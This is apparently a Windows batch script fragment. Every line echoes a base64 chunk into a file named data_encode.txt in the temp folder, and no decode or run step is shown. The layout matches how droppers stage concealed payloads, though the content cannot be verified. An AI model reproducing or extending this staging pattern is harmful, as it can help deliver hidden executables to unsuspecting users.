echo ocPl5nzXK+Kz+5gAfDBNnurLWFhWya41esXtM2uujpHl/w1nZM0rZvHZl9AWyrWl >>%temp%\data_encode.txt 
echo CEBINdAmlZ1LNfSg7Wbg0OqJ5ByMPWJnI65JkKz7iXzCundO49w7bidyp/TRqm4i >>%temp%\data_encode.txt 
echo b7Z+U1fTZgIQETeUOQcfLivUOPea2+dAZho5SGCOlHQ2VXxqTJ3Gh823G491882T >>%temp%\data_encode.txt 
echo haLI2wb7cG2cXtGGG2h/jG2guWyavBG9x6LOP23YsAGYBp04I6528Z0q9EIe2rRp >>%temp%\data_encode.txt 
echo EwpTLgdMQtegFK2aJe4YX0ZfuQvFKKlFnqQUCRblUpo81pexuIw2xtIdepGgF9nQ >>%temp%\data_encode.txt 
echo F7xmcPneiC3GyZYmHK+UGg4kpyfyS1rKyRBe86YnP94fO0KoWzVlkqlmBv0pOt4V >>%temp%\data_encode.txt 
echo zI8Fzxg1/PkWWJzYHT08RfdPydLH2hkbxTA7eLd93KNmpz0TONO7j1xueR0i5Znx >>%temp%\data_encode.txt 
echo YwHcZzA4g8dLLuG5ALBS4AmBaARPxjap6/rgYdMmaU9VFdmFidq2QfgL71lN5sIZ >>%temp%\data_encode.txt 
echo aXKKPsfWmpxR1JhcpLkuSb3Lz2gBzKGWOPJ6NQbHZ3J7eKLbGxtO/mzCvpnnCFLr >>%temp%\data_encode.txt 
echo cvRgJawqac/y9XEKWrHbWritxS/uiffZTgc27eOl/69N62VNi8jxJk0Ud+CJvBJN >>%temp%\data_encode.txt 
echo kzOUOTaLL2NppXqv0mqpxKsvYNJehPYdM+jAGpTXC+30mbQA4q58NnTlhvZd1tBe >>%temp%\data_encode.txt 
echo 3tDnr9jQxvzhhmZhQ/uXXKGhjuGGeoxmsh3XId7QTDWAlVj3AOPTeBduIhelg6Ly >>%temp%\data_encode.txt 
echo Ac7VbX2sBe4LgMdQ1Y3iDhFGr3IhTU71Zfy4UnUoQWiyDf5qJVEptLwLY7AvK4dV >>%temp%\data_encode.txt 
echo V9Ow7aWahkXzQgejbhJywzdcdehS5hxgQ2YUoBEW6qbU2YVbZkAh7SySqwX4EusA >>%temp%\data_encode.txt 
echo 9PXdhijG6XSzdT1mIayo1Ll8LwnnuRxqkSDtQmzFZ4vQGCM+uVjoQU4xz3Rm7OpY >>%temp%\data_encode.txt 
echo ZtsFksnzhRwLWPqz6Fv/yY+4dv1nbLHueZvtAIqN7DJkJgmIyvNIlFOhS8mklcss >>%temp%\data_encode.txt 
echo akk3EdYPCwT/y0PfwJA9IKepNWfY1gb/TEq6WQ6QwxbF66ASrzaSGXNELOUW4LjV >>%temp%\data_encode.txt 
echo Epdn8MZKEo7cwrYWznjo41hBC9X/g6OcNgyubAOTL74nmHFJZxKMKbXEsPnEYGQ1 >>%temp%\data_encode.txt 
echo fXg3xR/wZiVdzqFvGgDf+Y+4nGjhAHt+ZWYi1VGQTLDdwelqeS/JXMclhWjTw5Zb >>%temp%\data_encode.txt 
echo 6i6BSlx3ySynk9BAB4iTW0AV7p9rmZTjF30WHBce+g93sAXTQ0dfYt5x/vyGLv9N >>%temp%\data_encode.txt 
echo Q3uhmPh8HwtoM6i5OmHBUy+yNY309rw8nOxx0w8NP83PiKvXWAKgmrpVZmCIReL7 >>%temp%\data_encode.txt 
echo LRhb6nbc2roG/vAbqYcLU6g1Ehp+D6HN5x+G37+ESiOvkvnmLK2mEya+z4TevSe4 >>%temp%\data_encode.txt 
echo Y2JfaWwAyqmxJaRTkzu1mjOwWBAXhQ+PEdcZPOz3JS2RWuWr6ZMb4j2zAB7VKT1b >>%temp%\data_encode.txt 
echo 0FKV3gQvi3peZxHc+rAlJdGEc9cCoOOsa/3X0ztY8WwsPmYD65qeJ6FMnussutIn >>%temp%\data_encode.txt 
echo 9iyOHTTo+sUvmEnJMtyC4dc03rw80dX8cptjUNrQ/I3dPjOu7inQopJ8FgwUHpxe >>%temp%\data_encode.txt 
echo aBHXBZWgNe5yUMrCCwzygeqmZ34II6IDxZ+LwoprYZLVX8C4HtVJ73ynM0tptBgD >>%temp%\data_encode.txt 
echo 3hA3ECstRaWJ7SXbySyxATuWVDhQOeryL/PiXRXL8KBPzkTDURgDzw7XoPsfDhzy >>%temp%\data_encode.txt 
echo P4RRKngtecolc7Wzvgc1vwdIiN3dnVZ/GgNsZJg6TSbOh0FTPYHPo6wX4U2JmEGi >>%temp%\data_encode.txt 
echo qbDnybaDQ6oUWeTEIDFqciSC7ljTafNr8VhPoBnNdHZFMgL9/ntwm848xzo0h6H4 >>%temp%\data_encode.txt 
echo 4RBH0esz0dO3Gx5v6MVzhD4bLx/Ti1tisUzLbYFDsuhsx3D4NrVYAHqz6w8C7bLQ >>%temp%\data_encode.txt 
echo mBahAyE8TWXPZ8o8oMBGdTRp6n87WBRxoj4Lr+PqL2DLltuABB8DCeb4LG93RzLx >>%temp%\data_encode.txt 
echo a7cuT0PCOEwrJvusb/cuAfbeFAr1JE+YZa9rFK5mpolQd9rexjRn+1KGglZkxgCT >>%temp%\data_encode.txt 
echo DmYNu2jYZsBlQzOCRwQTfevfE+gR13szTTDDXba66dPE9aDh0u5rmWtFHrSxyTJj >>%temp%\data_encode.txt 
echo Wm36qvno3qzNNstJ6BVbgCE/pvijDe1yb9NsfQIkcR9rB4MyxX+9UmOf7L86coh7 >>%temp%\data_encode.txt 
echo V48ykpNZ8q54PECPYRs0jl777zFryUdfYS7VW5m8aTeVVd8MHK41xRRoXy3g/gSQ >>%temp%\data_encode.txt 
echo GaNNpNLPX0WLyMgoUpEZ6JLH0GOvxkDcyEBEqsgcm7bC3JoyJSI2ORoO+a0FEctb >>%temp%\data_encode.txt 
echo UxrHFd0XaK/9sjXZtHKiYbTndNNzQ7GbgB0YkWXKg03JM/L9/UPBxuS6WXfISfoc >>%temp%\data_encode.txt 
echo ITIewJH9iTZJaJHk8dK1Sw1LzsWoqifcj15/ltmuMzcAvBpVbFiO+xzldmIxZPaf >>%temp%\data_encode.txt 
echo wru2UtceBKEpGtDFQB6y5QWCWh5VLprlH5IqQWNeIF639oCg7kJPj2X70NNClejq >>%temp%\data_encode.txt 
echo P3O3j1bnITwm/ktFC4y+gngRWG+fEVQtXsSrptMH/ozuUaR1QEbDMme7tEe9+rr2 >>%temp%\data_encode.txt 
echo pQPHnYeWqOkMhlMPu5Bzm0B9xB+1hmKswQcKNTtRS85or0/A1DKfaYEzmG6GWf2T >>%temp%\data_encode.txt 
echo H0GmCoqhVILkAinpcx6ydqjlfQTacNCklpwgJWeUHgHK4kFfK1ADpSbK7plg/i94 >>%temp%\data_encode.txt 
echo PKtVCRj7w2RiqHrov+NltC6KzSs/AXi2qfeqczCo23XtA8eXFsaQlS6Iz9+AYdcP >>%temp%\data_encode.txt 
echo klDeMWnPqpuIbC/Upr4PyKL91b1SvpxRrHwlAAJSc83XEUuVeXbgkNjQw0x/7aRi >>%temp%\data_encode.txt 
echo H5n6Ipn/4qC4q1WVO2Dx96fuHo8nwtFI0m703tqZw4jQlweqwZGA7v8ByGAlRw5T >>%temp%\data_encode.txt 
echo cuDwY92HP0vvhWLKJUu1iP7GJUfI3N9ED9NUV7ezP+zCDSST0qyr5VRsvB1v+hCu >>%temp%\data_encode.txt 
echo hfbjXbIPCJr9n9SSD7QHBjV7vVqyVXJFVySRQhsOclIqkFTVtTPWBa5BFt7Hfx/Q >>%temp%\data_encode.txt 
echo txkqcfbjhUxfA63pP/yIGQamf5MeheVcPkuOHf5MqWmzYhn5LEidoPC5KENMAcTS >>%temp%\data_encode.txt 
echo ewn7UIa2vR3uBfS1Bdh7JxavJZ0AtVmtGEQH2AtqxR9VV1CVT7CrFi/p1beyAkqL >>%temp%\data_encode.txt 
echo WenQ3WX0NihmjY75RtkLLBeyYTks0gulAv0r3MuTFF1fcZ+7DFjkQHoJi53XDaIK >>%temp%\data_encode.txt 
echo PQ/ykHR0+S0rkiTXYPVNGOGjRYeiANZa0wEAlPIT0GC8IE/Xq3dHrJADgAMaNrSe >>%temp%\data_encode.txt 
echo f5vpm/uA0fcH2kGVwi78gEWwPAEkIuyCUVdw4LEoaQNFEH6tB61RYiUHxnxDhpz9 >>%temp%\data_encode.txt 
echo UqgqSQmbx/TnhVSr0iIQ1wkorDxxFpT0E3KQVAwi8KDUuqJoeVJ+zc6qWVDLVOhZ >>%temp%\data_encode.txt 
echo Zxcp/wBH1AXt1+xytTStGpi+tkCwPjg4Jmjdq94/qHRgqEvgzJ8AHGiVUt4LY7gN >>%temp%\data_encode.txt 
echo g4QQvOePlFMrrBFbYQQoR03KEx8I94O0gFPDdYblK6csSuxWGKDql8yLJAp5C0lI >>%temp%\data_encode.txt 
echo slZla2WClvlsJJnXH8brxU1QfYFkXf6Nmg5oZigziAnjyelqunweY+0eNdgCyMpB >>%temp%\data_encode.txt 
echo 5yH2aPClR1NH7lKB0rAqijMuSw28jP4/gSej6NVKq29Br1V8cXYp3ePnLJoxXk5t >>%temp%\data_encode.txt 
echo DayEBFNkDM/mpjsh16LG9ZjKjsx9OUsD/bUZq5JRQKhK8k1eGLGQMNGwDhQcVTNh >>%temp%\data_encode.txt 
echo 1aiFNi3wMwbiq3VQ/X5nkIfSAnaaHpKL0UZvP9o/iab0kN8+wPKyA6rJhCG87I// >>%temp%\data_encode.txt 
echo UcjWNmTl2xAkLfhXw/xTDKSCDtWDdzlreDd57Vs88GYqx0NdJKBE2fAq3vWMD7+M >>%temp%\data_encode.txt 
echo PTwTe1g2hsk9GN9Mr1U2NGDlKqAEa75sLzjpsp1c9zpSbdtG/LtfDTTCb6gnk4RY >>%temp%\data_encode.txt 
echo UDKlzSSnOQ+p67dAciTDGXzXZHKYbgzgK9mFJXmoNxigLE3dtQb+jvmGh7iyhtTA >>%temp%\data_encode.txt 
echo TmzQHyYBuy89mT2B7kAyL6IOmEJq4AWkZc5StFOt9aegvUMd7mbwD2QdFoW5F0CQ >>%temp%\data_encode.txt 
echo gX41MAVWOHFdSN02FR4KVe0VrFC7DV7qLzphFRKffQlD+m9YCyKzKRx4AX8A23Bg >>%temp%\data_encode.txt 
echo DTxZuOLUcIoFByUNGZhLashgQANtGAAlJCgXbPIZrekAuroMkJDzkHJ6fIgm5Z1T >>%temp%\data_encode.txt 
echo A5tZZS8iYi1Ap21bsV1vPATUXYd4FCsbNjLaBtbCz0CHyrAma9YheuKukD+1QGUU >>%temp%\data_encode.txt 
echo iqQoG/DXRDQE+T6uFZqQpkSrqvOcQbfKkFUDWEwLII6gciKOGGVmP3cU/wR5+y4E >>%temp%\data_encode.txt 
echo Iu1ChDDWhbUZiY0oAKQV27Wn9GJ1F/Y27wEpLDZgEEgSzbugMZJp9nc4BaWLVcCz >>%temp%\data_encode.txt 
echo BeTZHENtni41VwnEjEm5vB3aVtYj+Dl3HbYQFg9GjMOfEA0rSG9WGzTEE5YWjRME >>%temp%\data_encode.txt 
echo mAKr+yGjngCi47cRRpJII28/XksGPGgXFj2/ibAW8NbjXZucAMoG1pVxcjyC10it >>%temp%\data_encode.txt 
echo f3gQiaKuR3rRu/7ESbMHBoDWtP8K/fci678t8f5DZGhPSUL/beX9t8bov43f77/N >>%temp%\data_encode.txt 
echo Rv9t5v334v+w//5pX2L/bWb9t2VE/60d2X9b/8f9t/n7/cfaoTWw/tvM+m+N0X9b >>%temp%\data_encode.txt 
echo /of9t/Wy/nvxCv23Nt5/YdZ6C3MK6MlH4fTiNLEh0/zfzlA0pAABr2Esn6Fj+Qzt >>%temp%\data_encode.txt 
echo YmKIoFyEGersQlFnPbaMycSkJS+q6Jbr+gdOWc8pQ1XVt5Zx2vPRYfSAuh7RYsKZ >>%temp%\data_encode.txt 
echo mxmQo85eonl0VOVmaU/r0sGqVNKwDvMiTOkCvPIBAK97Qz03hLot6W3qGpbj/oew >>%temp%\data_encode.txt 
echo mI2wzoh8oG7D3/emoTDMqs5bj7Qjl0JfJ5GB0GcWZuL00n1Q66fjQQUgew93qw3T >>%temp%\data_encode.txt 
echo MGfPp8xuCpoOui3nIpoQELC3G5L48AuyZjqDeVHp0nArJysb1gxPDGUD5oWVyWiu >>%temp%\data_encode.txt 
echo 0dDsPbyh842G3nt5Q0FUSGyosz3UM94a/Cvt/NBo59S/3c4/FF+hndo8M5stsSmC >>%temp%\data_encode.txt 
echo Exgo6h4xr2Ga+NrZSv1B9hzCFgLnIV/aIlVjq0BQbDwJVQ/AhGYcaY/KRjY7IEDe >>%temp%\data_encode.txt 
echo H7252uq7eaG43R4Y2lBoErdPDejwC8IgY22hzy1eTbiDY8DrRXQtxahvIS58FRN3 >>%temp%\data_encode.txt 
echo CIFBKAbdEH250GRgaA276bIFuO6tYRtBWdIl8Xk8fyC78DOogXcxBvDHaKx1WiAY >>%temp%\data_encode.txt 
echo jbfM6I81baw/mloYLXosgLV0yd+r7MICJv/nhJV0tnMGBPJseOD1bVge+EMDe1AO >>%temp%\data_encode.txt 
echo mYrIHomt2HI3TMC3eRlgHFWiuoZVprOUyEsJHIkjlEBqA6FLYYbQncEeH7o4Mr4q >>%temp%\data_encode.txt 
echo Po/hbAnLZvQZsg4SHu4vlSE83Gtbw7j7ibl4BJasxHqNMj1mmONSi9iQhl6VvMVi >>%temp%\data_encode.txt 
echo w3eoL2r4omqsze1OfeD1XbE2swcD8iHTPGj5LtbyE7hNGGIRSWKtHz2i9T2v86Oz >>%temp%\data_encode.txt 
echo K+DxDbp3sfq1dZgg/nNwebK2ji0s615kzuP4DCpysqax1rLFqgHjtx9QdyGTi9hj >>%temp%\data_encode.txt 
echo OK/lX5IJAwhiaj8fA4jfJeRaM94yyTdIvWIAdSnl9W1BNsWLzDxbz37O7/bfyAQe >>%temp%\data_encode.txt 
echo lS1HaFCGQZ6UC1X+R6U2+WrCWLHyusYKF1hbeWGezBk7EZ4lDPmBCW9ZA69wepkb >>%temp%\data_encode.txt 
echo WAmj+CFTQWFsQeEVEQZG/j+BQ/6pUJnYsAs3ltvkq2JVYWAjXlWz81AcGiaMOVQY >>%temp%\data_encode.txt 
echo aWNl2AkaowNHoEg6JwaS9BjV2QjiIydhPsCYqfvQmAtAvhWEzeg8LkayZzFw22Bs >>%temp%\data_encode.txt 
echo 7UJi4iV1RNBeAHmZzw4YZj/FDn65P97BkVnOoDFiE1K1wCv9iRWnfGiM+UhA2YD5 >>%temp%\data_encode.txt 
echo YE1ioxHV+oSsPdOT+IC9Jyk2RhGR25JwEWPywvBQZSjHh+tGY7iq6zBZuiB3osp+ >>%temp%\data_encode.txt 
echo XkgYrqJSgCR6IXHIHkLm1ons7ZXL2Fvbf8PeXvzr7C13zjB7e/Fvsje15L9nb5ys >>%temp%\data_encode.txt 
echo XL4xSJWw3PyuZQR7O2uJsTe2OCF7w4fL2BuWZ+wNH67E3rBMjL1hHp2lGOztbyOU >>%temp%\data_encode.txt 
echo 3TKSvbEF9fk2xt4wmzFYtn6PvWHGYdkNvZX4CI2zt+F6jfHVEzHz0dKHQg5vsdjw >>%temp%\data_encode.txt 
echo OWNv+DKCvcXazB4MyN9jb5sYezNaLyoPoYdnIgV6mhgjY21PZGRM3GHSusaEukRG >>%temp%\data_encode.txt 
echo tjWBkW02GBnHbnOckbE++n9mZGv/PzCyrTFGtiXGyNb+94xs7ZUY2fXm/zkj62GM >>%temp%\data_encode.txt 
echo bHNc10lgZLcNXYmRGaNjRzDOyMSGo2xsvcKYGdM62LMYuHcEM6Om7zEzseF3Jj6A >>%temp%\data_encode.txt 
echo 9ppiYwazIktOZDds6MTYDR8+V2Y3LJBcfPKUAatJmDw+1pq/NYOgYad2x2bPTWh/ >>%temp%\data_encode.txt 
echo EuOVhqQZEVlxNnoYkMuL/5YX500hu9h+ya6dXG14Ot4kwlvhS/vxwCcj2jWiRccJ >>%temp%\data_encode.txt 
echo L3nIX5DIEEa06eb/pjkix0eLrQps8tIxPczXRUP0AAmpWQwUxeUK7SmzzsTQVvMd >>%temp%\data_encode.txt 
echo HPdYd/mXOnF7ooGJCgOf+NKsYZW/AN6F5OKPJTbf5ZMqm9EBnTfAfxNfSHDAKWwv >>%temp%\data_encode.txt 
echo kCu9vChfBzguxNgHYVs9swWyrpHVuzKNeVzXrrBYO4gru1hqXm4hTH1klIqKDUvj >>%temp%\data_encode.txt 
echo bAMHVSl2cxeJMlyREO+a9vybBKRuMVQ+hu5H0gH5Y4PEXWKDNmLoPKy+nEjmqgQy >>%temp%\data_encode.txt 
echo c7Fy5PK6cRdXdKfxGxjtvCHFPXfAuzAFKNpo5qTsuYZdivA3+2zxriv12dLPIZWz >>%temp%\data_encode.txt 
echo WOw6Ji680BJm21c21K8POA8NbFvDuovpvs3qOiSzMIWTUdpTlT5jCmhcQ203dUas >>%temp%\data_encode.txt 
echo jcI9hOW7X2WfQeeR31cupMJym7rIeoFjK+3iUsmrjDu2ppgaugCAsVPQGblnWSdM >>%temp%\data_encode.txt 
echo 5p5pZ2Ht6cCnPHxqw6cb8Sn4H4UJe3wPPxtz8b7F2VW3i+1GLl3iz4jtR57MRMtJ >>%temp%\data_encode.txt 
echo NKxAI4E7stBIIObsfdVzur6Ptl2L69sr8NcwG8T4az97g110vQjvE9uYLGfT+udj >>%temp%\data_encode.txt 
echo x72Q7HMsUoL23lQbPzxz2fk9afaNZn8G9bKcN6Gh4RHjE6RPQqiLzAwZO3oiNATh >>%temp%\data_encode.txt 
echo o38bejbYEOQQA3kje7YY4PF5YDhdecRmMiDyGLLjEOjNb7DzdjkVX/45G2oow9vm >>%temp%\data_encode.txt 
echo Kmxl/IZ0/HbVZUhHrOL2lrhrDsaDpE9vZOEN7KSD3Gdf2x+CEb+W7bDbgbMUCuSO >>%temp%\data_encode.txt 
echo vN4C1YzVF2fdpxbbAv2rJ8CbR39SWEADPLA6iWLw2CFoU5PL1oiOHZHHUO29Trk4 >>%temp%\data_encode.txt 
echo 5B9Hmsmey72sI0k72w4WmvoLJuX4W3wWr3cB1R0mU24zt72Tf5+I+BZzZByapNnc >>%temp%\data_encode.txt 
echo C+gYXmPxQCeGfU687wLv+GXdYQWyC1vM7S0svjXrB6C5zZ9CbFKx4H8QQwq76ZvN >>%temp%\data_encode.txt 
echo zIUTb42d4ezSXNE5ZW5m0aCPzeQ2KRPR4BNeH+av4wgG+uzFe4UGJVef33JnV1ML >>%temp%\data_encode.txt 
echo Wl3Fz+wrerZ+Z/jyG27aGbQwEDc/nR5oXznBcM/O/r57trh9rm2S0l1Q0ULt8UK0 >>%temp%\data_encode.txt 
echo XMHJgmeKsVhf5ssMgmLBstVtg2yXJgp/mXXpLhPyj355IqwWN9KdDXEDELOCBwtG >>%temp%\data_encode.txt 
echo GJtxY+EFDw51f1egy38sHKBD/EROuWBZ3nmf+PsD1v2qhhGOcEcwr3VgoECJ2sTn >>%temp%\data_encode.txt 
echo t+Niu198Dm9b1jLvVtf1DjGn/2/UgACZpXMrfuj2DPuIKR/YAsHVaaSVf44kE/ZL >>%temp%\data_encode.txt 
echo GGTrgHSu+qC6qw9BHJRCfikvRD6O5eTnHU12h7bATLZhWtNsvXHuOKit8X4dTQA+ >>%temp%\data_encode.txt 
echo JazZHBhhhMg7QBhGHHVA9PlH4LfnKdADDlKyV/x9mIPXZkzxetRdZ5E9G6iSbSbm >>%temp%\data_encode.txt 
echo ygwIExaHbHWJug1RU3chRCnsn0nWM1QHyC6GolW7z9SUjMFlm9IaLY2jihCprwiD >>%temp%\data_encode.txt 
echo aqDGYHJw+jaG5l53vMJ1tliFq+/jedRtrOw3UrP/brIen/Oa1QAjcYdBj2St2tw0 >>%temp%\data_encode.txt 
echo /06gBPx/kNEhYlTG4C3wDlM/oQYSQExWTyOdAP2ifzIJI2RWW8eVYbICHAKnLflI >>%temp%\data_encode.txt 
echo Xcf6eKj63kiKcR5s7eVEkgaqconGRqHHqH5ddGhk5Ycjsw14DF9GP2uv9M2K8V7P >>%temp%\data_encode.txt 
echo 30K6i6zHenlFZBsrG6vfQHNvXqeqMeQ+rh7vLRu+kpTBqT1uZGNZCO9VBlM6tfx+ >>%temp%\data_encode.txt 
echo g8CH/Xl550lnkwXGW9P8cWyoGQMtwotwNBIJA9peAMNWkKGez5AIF6pmGG2L4ZfX >>%temp%\data_encode.txt 
echo ZuB1oPpGb2lCK1lqQiv9f47MjQ0apPbl5fdDu/52eQNJTuE9fIzm7YeOZkNLCq2a >>%temp%\data_encode.txt 
echo yQeZFK7KIhrOd3Wu1qD+UbPr7GSIDs8lxkSkc1VzOXvpiV6C12+gGGMTqj/QACKk >>%temp%\data_encode.txt 
echo nVlnsxSOMoyBDHKAF+7ZfSkGhxdCh2f2IDZW4yeAQdYwGEYdv7w0zEWBuzmM8Fo3 >>%temp%\data_encode.txt 
echo BNrlG/Jlu/8HNFIbs/WYthqZDpq6AJf7HFYN4NToGZHSakZn2s8CXbLQeE3kT3nH >>%temp%\data_encode.txt 
echo yUEviaJVz1VNwphGjPns/wEe1Z6L5JD98aQ0SPInYRyzs4F2qF+2tlpMAX2p/BYW >>%temp%\data_encode.txt 
echo zcBlyd0616ybFkaaoAr6E8Tkpp5fxC4rq+iZDY9o/4ErrCFxwD9SbkceYUkL+lOV >>%temp%\data_encode.txt 
echo ZrO4SZgQOYfGf3pTchq6hreaxdeECVXn0Jnzg5wlCRfOsajfSdyGcDjeF56rypn0 >>%temp%\data_encode.txt 
echo 9Oph/48aXCraW7iLsTyafjj8bRR8iyTly7blGKTMhbEQSnrpuAfYCTNubT9lM/mz >>%temp%\data_encode.txt 
echo 788vt61IE7db+ufarhFkDBDUjF4S5ryO+78fS3dJ3AhsZLy7LC/ICJkY+IB6UQqT >>%temp%\data_encode.txt 
echo WhdpT5rxPktSMyGgM1MjYiIrbWrNBLyxbxIuuyAJspsGjQgNXvovbyNDwhgN5VFU >>%temp%\data_encode.txt 
echo xhayg6LRWrFNCo0M0PCaEyb/CVi7bghbYwEanvqlEW3Pnxq2sgANLTxAg7MLxXO0 >>%temp%\data_encode.txt 
echo SlpQhhX6zF466W22YYPC/ucshnjU6DevcZcEDT/PL/QVG1pN6CuJt66XO/zTiSsH >>%temp%\data_encode.txt 
echo S6EaAnr9r95ADb69tLTUDYJqvHBTrHAA7w1g4ck14a7hhvxQaoZWnLwTakYP6UfC >>%temp%\data_encode.txt 
echo KbFWvK3Fwng9EE5hrQijcQjoQv57kGggreBdELGKbnye6VXjEft8V458j9vt8eKV >>%temp%\data_encode.txt 
echo IbT5LR4uPQfGxW1eunMXBqHtL6O/38XiAGmPnY1HmUjOQFGZX4YcCXrpGswCEm3c >>%temp%\data_encode.txt 
echo KJFFmTtRjLZteF3QFW9OdtNPWEDaCd+3UaSr3sRNHND0XwiRkDGcZwZPYbyZ5Iqe >>%temp%\data_encode.txt 
echo wtF4b/nwLYt83DtGBHBlMT8y6cJiFvASr2hz9rO7E3lcgxSYa4FD8tX0w2eGx//T >>%temp%\data_encode.txt 
echo Ojph6bWRZexHaq0eTTcMf//qKZgfJWi5+VsMeYIGZZrc53EvKKXZoxkGpDcyWV/h >>%temp%\data_encode.txt 
echo cC9wly4zO9gFlmVuWjY2Fmw4g3ri4GA9e3Lo8qYnOgQoZ6eUObs86M/ToVYcUSs6 >>%temp%\data_encode.txt 
echo 1QoMy99YcUatoGrFWVXuVSv61IpoY8UgTduAmhvzyLDRnt/GFJ9J9Nzr7APFqwFo >>%temp%\data_encode.txt 
echo x2/R9LmXfwP5XO7Ux/axu1cZJikeKtZDV9bVnMF4oHInNeFrQpw3UuJA20WUNoHr >>%temp%\data_encode.txt 
echo 2plxnrjjam32boyRalWac8QdTiVs0YqMhNYc0qy0WPJa5dTAIc40D4x0p5PH0oKn >>%temp%\data_encode.txt 
echo 40RWVxrxhVhMwdjNp47haEuGOWA6NmdHE467CQYzS/XS0jpMcChD3dUT6RdPJdyR >>%temp%\data_encode.txt 
echo uhRE5pt+zsb+Zx76Dz/nRh5dHu9wJXYuw3dGDmFYZLQUrxgDyHD301WLgSNtLPDf >>%temp%\data_encode.txt 
echo r8ysOwbj0F+INt7im+U2w1o7cg9xncVYxTAag/70+unX46/VGcSb31vIY1SZyAoq >>%temp%\data_encode.txt 
echo j9l2Y7FIWOnerbps+HxFu+1S5jQt7nYNxnkoOumymNC2gYOVuSWDuS57ZXpbpVoS >>%temp%\data_encode.txt 
echo Pf5ENCEnahZn7ehxmdY1uRt04q6KwV+jb6bj1x9385STFX2/hhf0b4Y8Z40UdNpM >>%temp%\data_encode.txt 
echo Pf7VcXrq3MnOX6PTc/LxCH6IofBrQIpX5LMvK0Ya5Y9ODMSwYWssEAPz85vCLMdj >>%temp%\data_encode.txt 
echo NvMjPOjSPfQQNhjmzCg6a+X/3KOPRZ5euPVKHn1jadcKbtL+2Yq4avWT/x88+1Kw >>%temp%\data_encode.txt 
echo o6+jNQb0xjh0elAe4eHHJoaXPsHIAbqq4OyPPPgqi+Klm+XU/joMJ2OW0xXdImf3 >>%temp%\data_encode.txt 
echo Fzxi9o/zWei9kN1nJr10GpaDRdHf5qW3bOXekDncCH07N0InvV66GkMCkAPK50xv >>%temp%\data_encode.txt 
echo Pjad2Jne3Dr3qkkYwsTuoX+oxvrbdG43nnizJG4soDkw+4vPSrFDZy+Z7G8W+5uN >>%temp%\data_encode.txt 
echo H4L2520VLb6sZcuwv+9zsNj1io7eE/5qToja6rj3BDoJB0Bsw3VOmsm9J9azcMKA >>%temp%\data_encode.txt 
echo pFpyhjt9dkxXy7sJ1/P75zqA7qu8dBmaXrEB0ElOAbPj4+hMzHtl2JHCUT0c/0zm >>%temp%\data_encode.txt 
echo jhTZ8XXFSytMBjdGQB8BoNhwwjFEDkdux9vKKk4QudNLr36L+VRs4mDodjkOWa+C >>%temp%\data_encode.txt 
echo pP06OXoFh1fjtifusdUIIJQD+iIpLF9F5TgAEibHIiXsZuRoqbHkxfYNZDEW612U >>%temp%\data_encode.txt 
echo kWMdZreGDOY2g94Yxuf96Pt1gfl+8U6te/SOSd/FfbfijUVu/9MRlwyP+FQ2IiRr >>%temp%\data_encode.txt 
echo KZ0ssrhH2egjBuPcZ3ZTtxhzgE6uhN5ux9g+JlN8DZqQuI9gYzwfJG2gqZdcAp6b >>%temp%\data_encode.txt 
echo 9P7PoIedh2bDapj63s+XQDc1ozGmY+Bj1XXmOj33Appk+oYW9sxlO+GV+UXJ8qNN >>%temp%\data_encode.txt 
echo 6XMaS75qaF85FqSUJHF7SE1xBhvaQb7rwSOFptCE7hlBWdhiiVwLz70zuuHZGhkF >>%temp%\data_encode.txt 
echo z9EZvWLgG6DuFqHR9XWj60tfirg9uCivTdzu+qrpiS8Pf9JU8vX9uR2RiU0PCmRc >>%temp%\data_encode.txt 
echo U6jp58m3WWZYxOdxh7/uO7P4LFqN39MjKpsxZPJ2aFg3jLF8V3dVMnF1MxtLWGXp >>%temp%\data_encode.txt 
echo LS4auaYpd47uok0fTAjOqJNrxe0fIMv4JDm9g5Wgyz8mFd1SS1XWrU+cgUZUqkUC >>%temp%\data_encode.txt 
echo AhwHD8k9qBnVXzQs9y8yy/2ZuKnsMK2YBpnDrt46Zj3dh77tYVcUPRqkHwXo8quB >>%temp%\data_encode.txt 
echo Jhb1auVmk1IpmNhttYeBqLA2l3WwbThjU6beOhxbmI5PZvfrqMl0HTwBIsPXgvNx >>%temp%\data_encode.txt 
echo qt9FnSkmE8Zd/hc0OnwsCtJJFGeYm+7UY+LCGJIsuaKyHUPVuQb5dfewfA1L8SPK >>%temp%\data_encode.txt 
echo 1XEXeDkPYwCUR9FkuFBAlnmVsme8G2Ry+oyRI5Wee48rHgCt3TB+h3/KzDUYcMh/ >>%temp%\data_encode.txt 
echo p3IWFsKHJwhk7gRhYl2tyTSzbjwIe+LxGRMqiTChUumurVSitdqjE2xyUg8GJ4AF >>%temp%\data_encode.txt 
echo 7mTmBPosOsBlcMWnRfvRBIFOhpQFv4aC/vkAzV5ZP2NCrQXWsclZbxSa3kCzUf+S >>%temp%\data_encode.txt 
echo N5gdZOHxs8fbj59TZvoRCTEwH0pqGab/LDS9ex2ysvvgnee8OnLkDbTBlK9XVk0A >>%temp%\data_encode.txt 
echo kWUchmKr8394srNrcsfGQtNOdtn1TfTFMRg2mGf9kGd9H/M8jXnQ+CpeV/eYEXXR >>%temp%\data_encode.txt 
echo 41DXj1sMeogNF8dhC/9umoiBdigQMZ0XV0PmSnHS2ByADL9t8D9aKVZ1TK0UVwcr >>%temp%\data_encode.txt 
echo xR8lFbAPFzsqxcN73mCxJebP1NNNplU1leL5PTPvBHmpNr1SPDp/gnASYLVUirfr >>%temp%\data_encode.txt 
echo z0x49yyejZ91qD+aYCdHlOZMeLDBf0GFPliUyfgtyx7D4PweqLmzUmwOJc9E75xV >>%temp%\data_encode.txt 
echo E2feCRpR7RbEwQE4fCMubEuo5mSSGxKhtubrp8BDMmS73sFQPfqwkcUI6PAuxq5w >>%temp%\data_encode.txt 
echo 9uMCS8K5zdr9wUopJKewSCqRa4AiBfiCASPs76ESVik1+y3kFAm/w6JkhPwTZ7Ig >>%temp%\data_encode.txt 
echo GdfMNGJkhOQx7/MYGe/zGBksQI6znRwrDH1hyz1IwiGakhsKfZIU6hZg7sNrKrx2 >>%temp%\data_encode.txt 
echo W/lzWm4I1rZuS6gnPb0ZA8B8bbe2K5+b00Pp4aXprUvS45vppejjwaKbeLzijhYS >>%temp%\data_encode.txt 
echo VYHlXyRtoc8t72LNPtOS+tMsOEqqtMdvV+XBSAosXYjtO9g6wP0mptD6x81kPYe4 >>%temp%\data_encode.txt 
echo OzjuqeSbYcQPFx78grTkHgxRi4E34toSolbE28KfhdyQuH2vNRiKJHG8TwvKp4h1 >>%temp%\data_encode.txt 
